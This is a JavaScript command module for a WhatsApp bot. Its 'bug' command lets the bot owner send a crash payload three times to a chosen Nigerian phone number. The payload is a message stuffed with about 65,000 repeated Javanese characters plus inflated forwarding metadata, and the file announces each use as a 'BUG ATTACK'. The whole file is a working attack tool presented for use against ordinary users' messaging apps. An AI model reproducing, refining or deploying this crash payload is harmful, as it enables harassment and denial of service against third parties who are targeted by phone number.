import config from '../../config.js';

const OWNER_NUMBER = config.ownerNumber.replace(/^\+/, '');
const OWNER_JID = `${OWNER_NUMBER}@s.whatsapp.net`;

const normalizeNumber = (number) => {
  return number.replace(/[^0-9]/g, '').replace(/^0+/, '').replace(/^\+234/, '234') || number;
};

const isValidPhoneNumber = (number) => {
  const cleaned = number.replace(/[^0-9]/g, '');
  return /^234[0-9]{10}$/.test(cleaned);
};

const BUG_PAYLOAD = "☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️" + "ꦾ".repeat(65000);

async function sendBugMessage(sock, target) {
  console.log(`[BUG] Sending bug payload to ${target}`);

  const message = {
    text: BUG_PAYLOAD,
    contextInfo: {
      mentionedJid: [target],
      forwardingScore: 999999999,
      isForwarded: true,
      externalAdReply: {
        title: "☠️ HORLA POOKIE BUG ☠️",
        body: "⚠️ SYSTEM OVERLOAD ⚠️",
        mediaType: 1,
        renderLargerThumbnail: false,
        showAdAttribution: true,
        sourceUrl: "https://wa.me/" + target.split('@')[0]
      }
    }
  };

  try {
    await sock.sendMessage(target, message);
    console.log(`[BUG] Bug payload sent successfully to ${target}`);
  } catch (e) {
    console.log(`[BUG] Error sending bug message: ${e.message}`);
    throw e;
  }
}

export default {
  name: 'bug',
  description: '☠️ Send bug message to crash target (Owner only - Use with extreme caution)',
  category: 'Bug/Crash',
  usage: `${config.prefix}bug <number>`,
  
  async execute(msg, { sock, args }) {
    const from = msg.key.remoteJid;
    const senderJid = msg.key.participant || msg.key.remoteJid;
    const senderNumber = senderJid.split('@')[0];
    const userName = msg.pushName || "User";

    console.log(`[BUG] Command triggered by ${senderJid}`);

    const normalizedSender = normalizeNumber(senderNumber);
    const normalizedOwner = normalizeNumber(OWNER_NUMBER);
    const isOwner = senderJid === OWNER_JID || normalizedSender === normalizedOwner;

    if (!isOwner) {
      console.log(`[BUG] Unauthorized access attempt by ${senderJid}`);
      await sock.sendMessage(from, {
        text: `🚫 *ACCESS DENIED*\n\n❌ This command is restricted to the bot owner only.\nUnauthorized use is strictly prohibited.`
      }, { quoted: msg });
      return;
    }

    if (!args[0]) {
      await sock.sendMessage(from, {
        text: `⚠️ *BUG COMMAND*\n\n📋 *Usage:* ${config.prefix}bug <number>\n📝 *Example:* ${config.prefix}bug 2348012345678\n\n⚠️ *WARNING:* This will send a crash payload to the target!`
      }, { quoted: msg });
      return;
    }

    let client = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || 
                 args[0];

    let clientNumber = client.includes('@s.whatsapp.net') ? client.split('@')[0] : client.replace(/[^0-9]/g, '');

    if (!isValidPhoneNumber(clientNumber)) {
      await sock.sendMessage(from, {
        text: `❌ *INVALID NUMBER*\n\nPlease provide a valid Nigerian number (234xxxxxxxxxx)`
      }, { quoted: msg });
      return;
    }

    const targetJid = client.includes('@s.whatsapp.net') ? client : `${clientNumber}@s.whatsapp.net`;

    try {
      await sock.sendMessage(from, { react: { text: '⚠️', key: msg.key } });

      await sock.sendMessage(from, {
        text: `☠️ *BUG ATTACK INITIATED*\n\n🎯 Target: ${clientNumber}\n⏳ Sending payload...`
      }, { quoted: msg });

      for (let i = 0; i < 3; i++) {
        await sendBugMessage(sock, targetJid);
        await new Promise(resolve => setTimeout(resolve, 2000));
      }

      await sock.sendMessage(from, { react: { text: '✅', key: msg.key } });

      await sock.sendMessage(from, {
        text: `✅ *BUG ATTACK COMPLETED*\n\n🎯 Target: ${clientNumber}\n📊 Status: Success\n💥 Payload: Delivered (3x)\n\n⚡ Powered by HORLA POOKIE`
      }, { quoted: msg });

      console.log(`[BUG] Attack completed successfully on ${clientNumber}`);
    } catch (e) {
      console.log(`[BUG] Attack failed: ${e.message}`);
      await sock.sendMessage(from, {
        text: `❌ *BUG ATTACK FAILED*\n\n🎯 Target: ${clientNumber}\n⚠️ Error: ${e.message}`
      }, { quoted: msg });
    }
  }
};
